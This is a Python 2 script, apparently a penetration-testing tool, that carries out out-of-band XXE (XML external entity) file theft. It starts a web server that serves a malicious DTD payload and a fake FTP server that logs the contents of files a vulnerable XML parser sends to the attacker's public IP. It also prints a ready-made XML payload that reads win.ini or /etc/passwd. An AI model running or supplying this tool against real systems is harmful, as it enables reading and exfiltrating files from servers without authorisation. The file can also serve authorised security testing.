#!/usr/bin/env python
# coding: utf-8
# -**- Author: LandGrey -**-
# Referer: https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/python/xxe-server.py

import socket
import logging
import SocketServer
from sys import argv
from time import sleep
from threading import Thread


def logger(_str, is_print=False):
    if is_print:
        print _str
    logging.info("{}\n".format(_str))


class WebServer(SocketServer.BaseRequestHandler):
    def handle(self):
        resp = """HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: {}\r\n\r\n{}\r\n\r\n""".format(len(payload), payload)
        # self.request is a TCP socket connected to the client
        self.data = self.request.recv(4096).strip()
        logger("[WEB] {} Connected and sent:".format(self.client_address[0]))
        logger("{}".format(self.data))
        # Send back same data but upper
        self.request.sendall(resp)
        logger("[WEB] Replied with:\n{}".format(resp))


class FTPServer(SocketServer.BaseRequestHandler):
    def handle(self):
        """
        FTP Java handler which can handle reading files
        and directories that are being sent by the server.
        """
        self.request.settimeout(10)
        logger("[+] victim [{}] has connected FTP !".format(self.client_address[0]), is_print=True)
        self.request.sendall("220 ftp-server\n")
        try:
            while True:
                self.data = self.request.recv(4096).strip()
                if self.data.startswith("RETR "):
                    logger("[+] FTP Received File:\n{separator}\n{}\n{separator}".format(self.data.lstrip("RETR "), separator="=" * 50), is_print=True)
                else:
                    in_key = False
                    keys = ["USER", "PASS", "TYPE", "EPRT", "EPSV", "QUIT"]
                    for key in keys:
                        if self.data.startswith(key):
                            in_key = True
                            logger("[+] FTP: {}".format(self.data), is_print=True)
                            break
                    if not in_key:
                        if str(self.data) == '':
                            logger("[*] file exists! maybe target cannot send multi-lines file!(jdk<7u141/jdk<8u162 supported)".format(self.data), is_print=True)
                        else:
                            logger("{}".format(self.data[self.data.find(" ")+1:]), is_print=True)
                if "LIST" in self.data:
                    self.request.sendall("drwxrwxrwx 1 owner group          1 Feb 21 01:11 rsl\n")
                    self.request.sendall("150 Opening BINARY mode data connection for /bin/ls\n")
                    self.request.sendall("226 Transfer complete.\n")
                elif "USER" in self.data:
                    self.request.sendall("331 password please - version check\n")
                elif "PORT" in self.data:
                    logger("[+] FTP PORT received")
                    logger("[+] FTP > 200 PORT command ok")
                    self.request.sendall("200 PORT command ok\n")
                elif "SYST" in self.data:
                    self.request.sendall("215 RSL\n")
                else:
                    logger("[+] FTP > 230 more data please!")
                    self.request.sendall("230 more data please!\n")
        except Exception as e:
            if "timed out" in e:
                logger("[*] FTP Client timed out")
            else:
                logger("[-] FTP Client error: {}".format(e), is_print=True)
        logger("[*] FTP Connection closed with {}".format(self.client_address[0]))


def start_server(conn, serv_class):
    try:
        server = SocketServer.TCPServer(conn, serv_class)
        t = Thread(target=server.serve_forever)
        t.daemon = True
        t.start()
    except socket.error as e:
        if "[Errno 10048]" in str(e):
            exit("[-] Port [{}] is already in use".format(conn[1]))
        else:
            exit(str(e))


if __name__ == "__main__":
    if len(argv) == 2:
        public_ip = argv[1]
        web_bind_port = 80
        ftp_bind_port = 2121
    elif len(argv) == 4:
        public_ip = argv[1]
        web_bind_port = int(argv[2])
        ftp_bind_port = int(argv[3])
    else:
        exit("""[*] Usage   : python xxe-ftp-server.py public-ip-address
              python xxe-ftp-server.py public-ip-address web-port ftp-port
[*] Such as : python xxe-ftp-server.py 1.1.1.1 80 2121""")

    logging.basicConfig(filename='xxe-ftp-server.log', level=logging.DEBUG)

    WEB_Server = ("0.0.0.0", web_bind_port)
    FTP_Server = ("0.0.0.0", ftp_bind_port)
    payload = """<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://{}:{}/%file;'>"> %all;"""
    payload = payload.format(public_ip, FTP_Server[1])
    start_server(WEB_Server, WebServer)
    logger("[+] WEB server Starting on [{}:{port:<5}]".format(public_ip, port=WEB_Server[1]), is_print=True)
    start_server(FTP_Server, FTPServer)
    logger("[+] FTP server Starting on [{}:{port:<5}]".format(public_ip, port=FTP_Server[1]), is_print=True)
    print("[+] Send The Following XML Payload to the server, [c:/windows/win.ini] can replaced [etc/passwd]\n" + "=" * 50)
    print("""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
  <!ENTITY % dtd SYSTEM "http://{}:{}/data.dtd"> %dtd;
]>
<data>&send;</data>""".format(public_ip, web_bind_port))
    print("=" * 50 + "\n[+] Wait for FTP connecting ...")
    try:
        while True:
            sleep(3000)
    except KeyboardInterrupt, e:
        print("\n[*] Server shutting down")
